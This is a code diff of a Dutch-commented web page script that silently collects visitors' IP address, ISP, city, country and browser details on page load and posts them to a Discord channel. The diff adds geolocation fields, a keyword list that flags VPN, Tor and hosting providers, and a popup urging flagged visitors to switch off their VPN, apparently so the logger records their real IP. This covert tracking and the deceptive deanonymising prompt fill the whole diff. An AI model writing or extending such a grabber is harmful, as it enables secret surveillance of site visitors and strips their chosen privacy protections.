@@ -15,7 +15,10 @@ async function getIPInfo() {
             ip: ipData.ip,
             provider: details.org,
             hostname: details.hostname || 'Niet beschikbaar',
-            socket: `${details.ip}:${location.port || '80'}`
+            socket: `${details.ip}:${location.port || '80'}`,
+            country: details.country_name || 'Onbekend',
+            city: details.city || 'Onbekend',
+            isp: details.org || 'Onbekend'
         };
     } catch (error) {
         console.error('Fout bij ophalen IP informatie:', error);
@@ -23,8 +26,94 @@ async function getIPInfo() {
             ip: 'Niet beschikbaar',
             provider: 'Niet beschikbaar',
             hostname: 'Niet beschikbaar',
-            socket: 'Niet beschikbaar'
+            socket: 'Niet beschikbaar',
+            country: 'Onbekend',
+            city: 'Onbekend',
+            isp: 'Onbekend'
         };
+    }
+}
+
+// Functie om te controleren of een gebruiker een VPN gebruikt
+async function checkVPN(ipInfo) {
+    try {
+        // Controleer op bekende VPN-providers in de ISP naam
+        const vpnKeywords = [
+            'vpn', 'proxy', 'tunnel', 'tor', 'anonymous', 'hide', 'private network',
+            'nordvpn', 'expressvpn', 'cyberghost', 'protonvpn', 'surfshark', 'privatevpn',
+            'mullvad', 'ipvanish', 'purevpn', 'hotspot shield', 'tunnelbear', 'windscribe',
+            'avast secureline', 'norton secure', 'kaspersky', 'f-secure', 'avira phantom',
+            'digital ocean', 'linode', 'aws', 'amazon', 'azure', 'google cloud', 'oracle cloud',
+            'hosting', 'datacenter', 'data center'
+        ];
+        
+        // Controleer of de ISP naam een van de VPN-keywords bevat
+        const ispLower = ipInfo.isp.toLowerCase();
+        const isVPN = vpnKeywords.some(keyword => ispLower.includes(keyword));
+        
+        // Controleer of het land verschilt van de verwachte locatie (optioneel)
+        // Dit zou je kunnen uitbreiden met een database van verwachte landen per regio
+        
+        return isVPN;
+    } catch (error) {
+        console.error('Fout bij controleren VPN:', error);
+        return false;
+    }
+}
+
+// Functie om de VPN-popup te tonen
+function showVPNPopup() {
+    // Controleer of de popup al bestaat
+    if (document.getElementById('vpn-popup')) {
+        return;
+    }
+    
+    // Maak de popup container
+    const popup = document.createElement('div');
+    popup.id = 'vpn-popup';
+    popup.className = 'vpn-popup';
+    
+    // Voeg de popup inhoud toe
+    popup.innerHTML = `
+        <div class="vpn-popup-content">
+            <h2>VPN Gedetecteerd</h2>
+            <p>We hebben gedetecteerd dat u mogelijk een VPN of proxy gebruikt. Voor de beste ervaring op onze website, zou u deze kunnen uitschakelen.</p>
+            <div class="vpn-popup-buttons">
+                <button id="vpn-disable-btn" class="vpn-btn vpn-primary-btn">VPN Uitschakelen</button>
+                <button id="vpn-continue-btn" class="vpn-btn vpn-secondary-btn">Nee, ik wil niet</button>
+            </div>
+        </div>
+    `;
+    
+    // Voeg de popup toe aan de body
+    document.body.appendChild(popup);
+    
+    // Voeg event listeners toe aan de knoppen
+    document.getElementById('vpn-disable-btn').addEventListener('click', () => {
+        // Hier zou je een redirect kunnen doen naar een pagina met instructies
+        // voor het uitschakelen van VPN, maar voor nu sluiten we gewoon de popup
+        closeVPNPopup();
+    });
+    
+    document.getElementById('vpn-continue-btn').addEventListener('click', () => {
+        closeVPNPopup();
+    });
+    
+    // Toon de popup met een fade-in effect
+    setTimeout(() => {
+        popup.classList.add('show');
+    }, 100);
+}
+
+// Functie om de VPN-popup te sluiten
+function closeVPNPopup() {
+    const popup = document.getElementById('vpn-popup');
+    if (popup) {
+        popup.classList.remove('show');
+        // Verwijder de popup na de fade-out animatie
+        setTimeout(() => {
+            popup.remove();
+        }, 300);
     }
 }
 
@@ -59,14 +148,14 @@ function getBrowserInfo() {
 }
 
 // Functie om gegevens naar Discord te sturen
-async function sendToDiscord(ipInfo, browserInfo) {
+async function sendToDiscord(ipInfo, browserInfo, isVPN) {
     const embed = {
         title: '🔍 Nieuwe Bezoeker Gedetecteerd',
-        color: 3447003,
+        color: isVPN ? 15158332 : 3447003, // Rood als VPN, blauw als geen VPN
         fields: [
             {
                 name: '🌐 Internet & IP Informatie',
-                value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}`,
+                value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}\n**Land:** ${ipInfo.country}\n**Stad:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}\n**VPN Gedetecteerd:** ${isVPN ? '✅ Ja' : '❌ Nee'}`,
                 inline: false
             },
             {
@@ -95,5 +184,13 @@ async function sendToDiscord(ipInfo, browserInfo) {
 document.addEventListener('DOMContentLoaded', async () => {
     const ipInfo = await getIPInfo();
     const browserInfo = getBrowserInfo();
-    await sendToDiscord(ipInfo, browserInfo);
+    const isVPN = await checkVPN(ipInfo);
+    
+    // Stuur informatie naar Discord
+    await sendToDiscord(ipInfo, browserInfo, isVPN);
+    
+    // Toon de VPN-popup als een VPN is gedetecteerd
+    if (isVPN) {
+        showVPNPopup();
+    }
 }); 
